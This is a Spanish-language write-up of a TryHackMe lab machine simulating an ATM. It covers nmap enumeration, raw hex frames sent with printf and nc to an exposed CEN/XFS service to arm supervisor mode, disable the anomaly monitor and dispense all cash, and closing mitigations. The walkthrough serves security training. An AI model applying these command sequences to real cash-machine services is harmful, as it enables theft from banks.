---
title: Jackpot
date: '2026-11-08'
draft: false
description: Writeup de la máquina Jackpot en TryHackMe.
categories: TryHackMe
tags:
  - Information Disclosure
  - Exposed Service
  - Business Logic
level: Medium
---

# Enumeración

Comenzamos con la enumeración general, sobre todos los puertos primero detectando los que se encuentran abiertos con ayuda de `nmap`:
```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.67.159.182 -oG allPorts
```

![img2745](/writeups/tryhackme/jackpot/media/2745.webp)
El resultado nos muestra que tenemos los puertos `22, 8080, 9100` abiertos, por lo tanto, vamos a realizar un escaneo específico sobre estos puertos de la siguiente manera:

```bash
nmap -p22,8080,9100 -sVC 10.67.159.182 -oN target
```

![img2746](/writeups/tryhackme/jackpot/media/2746.webp)
Excelente, ahora tenemos no solo los puertos y servicios, sino también tenemos sus versiones que pueden ser de ayuda.

En este punto vamos a comenzar a investigar un poco más sobre los puertos. Comenzaré analizando lo que es el servicio de `HTTP` por el puerto `8080` ingresando directamente desde el navegador.

![img2747](/writeups/tryhackme/jackpot/media/2747.webp)

Observamos que, como se nos reportó en el escaneo en verdad es Python aunque no podemos asegurar del todo su versión podemos asegurar que la tecnología sí lo es, por lo tanto, podemos sacar una lista de posibles frameworks usados como lo son Flask o Django pero no podemos asegurar nada. Además, la web nos revela mucha información que concuerda con la descripción que se nos proporcionó y observamos un mensaje que nos habla de puertas remotas mediante el servicio CEN/XFS el cual es un estándar internacional de software utilizado en los cajeros esto porque antes los bancos fabricaban software sobre marcas específicas impidiendo el funcionamiento en otras marcas, para esto se desarrolló CEN/XFS que funciona como un traductor de software a hardware para las diferentes marcas de cajero traduciendo instrucciones de forma específica para la marca del cajero.

Ahora verificamos su código fuente desde el navegador:

![img2748](/writeups/tryhackme/jackpot/media/2748.webp)

Como observamos encontramos una ruta a la que un script incrustado en el propio HTML hace referencia, veamos qué contiene:

![img2749](/writeups/tryhackme/jackpot/media/2749.webp)

Observamos que son los datos representados en la web en realidad, donde el que resaltamos es el `session code`.

Bueno si regresamos a la web principal tenemos un archivo el cual podemos descargar, vamos a hacerlo:

![img2750](/writeups/tryhackme/jackpot/media/2750.webp)
Si analizamos el archivo es un binario compilado el cual podemos ejecutar:
![img2751](/writeups/tryhackme/jackpot/media/2751.webp)
Al intentar ejecutar como podemos observar, nos pide un `session code` y si recordamos tenemos uno en la web así que vamos a enviárselo a ver qué sucede:

```bash
./jackpot 148947
```
![img2752](/writeups/tryhackme/jackpot/media/2752.webp)
Esto nos devuelve un código de activación, aún no sabemos para qué, pero puede servirnos luego así que vamos a tenerlo en cuenta.

No logré encontrar nada más por aquí, así que pasamos directamente con otro de los puertos que es el `9100`, el cual se nos representó con el servicio de `jetdirect`, pero no logramos obtener una versión y esto es extraño así que por qué no realizamos una conexión y verificamos de qué se trata:

```bash
nc 10.67.159.182 9100
```
![img2753](/writeups/tryhackme/jackpot/media/2753.webp)
# Explotación

Si leemos un poco en la respuesta de la conexión observamos que habla sobre `XFS` lo que me hace pensar que en realidad mediante ese puerto se está comunicando este servicio.

Si continuamos leyendo miramos que nos da un formato sobre cómo enviar el mensaje el cual tenemos que seguir, luego tenemos los tipos de mensajes que podemos utilizar y por último una pista que, en específico nos dice intentar ejecutar el comando `0x0304` perteneciente a `WFS_INF_CDM_CAPABILITIES`.

Con esto claro, a partir de aquí voy a realizar el procedimiento correcto exacto necesario para no alargar mucho el writeup.

Primero vamos a armar correctamente el formato de las peticiones en formato hexadecimal utilizando `GETINFO`, donde su valor es `0x01` y lo que vamos a utilizar como `command id` es el `0x0304` que nos sugirió.

```bash
printf '\x01\x00\x00\x03\x04\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
```
![img2754](/writeups/tryhackme/jackpot/media/2754.webp)
Listo lo correcto a partir de aquí es ejecutar todos los comandos para comprender qué hace y que errores o mensajes nos dan en específico cada uno y lo voy a poner directamente:

```bash
printf '\x01\x00\x00\x03\x01\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo

 printf '\x01\x00\x00\x03\x03\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
 
 printf '\x01\x00\x00\x04\x01\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
 
 printf '\x01\x00\x00\x04\xf0\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
 
 printf '\x01\x00\x00\x04\xf1\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
 
 printf '\x01\x00\x00\x04\xff\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
```
![img2755](/writeups/tryhackme/jackpot/media/2755.webp)
Lo que estamos observando son las salidas respectivas de cada comando y aquí aunque parece todo un desorden en realidad esto nos ayudará a comprender el panorama completo y comprender cada conclusión. El primer comando con un poco de atención observamos que es el mismo contenido de la web así que de alguna forma la web puede que se esté comunicando directa o indirectamente con el servicio CEN/XFS. Luego el segundo comando nos lista algo parecido yo diría que algo resumido por cuenta pero nada más. El tercer comando es más interesante, si nos fijamos con atención nos habla de dispensar, es decir este en específico es el comando que envía las solicitudes de retiros. El cuarto comando podemos observar como nos especifica algo de código inválido eso quiere decir que en realidad espera un código. El quinto directamente nos habla de no armado, puede que tenga que ver algo con el código anterior que no enviamos. Por último tenemos el que al parecer será el comando responsable de darnos la flag.

Perfecto ahora con esto comenzamos el proceso enviando primero el código de armado y para esto recordemos que tenemos un código de activación que nos proporcionó el binario que descargamos:

```bash
printf '\x02\x00\x00\x04\xf0\x00\x0880036065' | nc -q 1 10.67.159.182 9100 ; echo
```

![img2756](/writeups/tryhackme/jackpot/media/2756.webp)
Como observamos ya activamos el modo supervisor y está como armado, por lo tanto, por qué no intentamos hacer un retiro:
![img2757](/writeups/tryhackme/jackpot/media/2757.webp)
La primera vez sin problema, pero luego nos bloqueó y si observamos con más atención vemos que nos habla de una anomalía y nos bloquea, al terminar el bloque vamos a tener que volver a realizar el proceso sin intentar nuevamente retiros aún.

Una vez estemos armados vamos a ejecutar el quinto comando nuevamente porque este especificaba algo sobre el armado y que tenía que estar armado porque no lo intentamos a ver qué obtenemos ahora que si lo está:

```bash
printf '\x01\x00\x00\x04\xf1\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
```
![img2758](/writeups/tryhackme/jackpot/media/2758.webp)
Como observamos el mensaje es diferente, nos habla de un monitor que puede ser lo que detectó la anomalía así que vamos a intentar desactivarlo, recordemos que `1 -> True y 0 -> False `, así que vamos a intentarlo de la siguiente manera:

```bash
printf '\x02\x00\x00\x04\xf1\x00\x010' | nc -q 1 10.67.159.182 9100 ; echo
```
![img2759](/writeups/tryhackme/jackpot/media/2759.webp)
Como observamos lo desactivamos sin problemas así que intentemos ahora sí retirar el dinero nuevamente:
![img2760](/writeups/tryhackme/jackpot/media/2760.webp)
Como observamos logramos retirar todo el dinero dentro restante y si nos fijamos dice que la flag ya está disponible ahora ¿por qué no intentamos verla a ver si es verdad?, recordemos que el último comando era el que nos lo permitía:

```bash
printf '\x01\x00\x00\x04\xff\x00\x00' | nc -q 1 10.67.159.182 9100 ; echo
```

![img2761](/writeups/tryhackme/jackpot/media/2761.webp)
Esto es perfecto ya observamos la flag.

# Mitigaciones

Como es claro la ciberseguridad no es solo romper, sino también reconocer y solventar las debilidades de los sistemas es por eso que como parte final de la resolución de esta máquina voy a proponer algunas mitigaciones para este sistema:

## Exposición de códigos de sesión y binarios sensibles

La aplicación web exponía información crítica, como el código de sesión a través de rutas accesibles en el código fuente, además de permitir la descarga directa de un binario compilado que facilitaba la obtención de credenciales de activación. La mitigación consiste en implementar un control de acceso estricto en las rutas y endpoints de la aplicación, evitando que datos sensibles o binarios internos sean accesibles sin autenticación previa. Asimismo, se debe aplicar ofuscación o proteger los binarios cliente mediante mecanismos de validación en el servidor para evitar la ingeniería inversa no autorizada.

## Servicio CEN/XFS expuesto sin autenticación

El puerto 9100 exponía directamente el protocolo CEN/XFS sobre un socket TCP sin requerir ningún tipo de autenticación previa, permitiendo el envío de tramas hexadecimales para interactuar con los comandos del cajero, consultar información y manipular el estado del sistema. Como mitigación, los servicios internos o pasarelas de hardware no deben exponerse directamente a la red ni a interfaces de red públicas. Se debe implementar restricción de acceso mediante cortafuegos (Firewalls), túneles seguros (VPN), o bien exigir una capa de autenticación y cifrado robusta antes de aceptar comandos de control en servicios críticos.

## Deficiencias en la lógica de negocio y control de anomalías

El sistema permitía realizar retiros de efectivo y alterar los estados lógicos de funcionamiento (como el modo de armado o la desactivación del monitor de anomalías) mediante una secuencia de comandos mal validados o susceptibles a manipulación de flujo. La mitigación requiere un rediseño de las reglas de negocio en la validación de estados y transacciones, asegurando que cada cambio de estado crítico (como desactivar monitores de seguridad) requiera un proceso de autorización estricto de múltiples factores o validaciones en el servidor que no puedan ser eludidas enviando comandos secuenciales de forma directa.
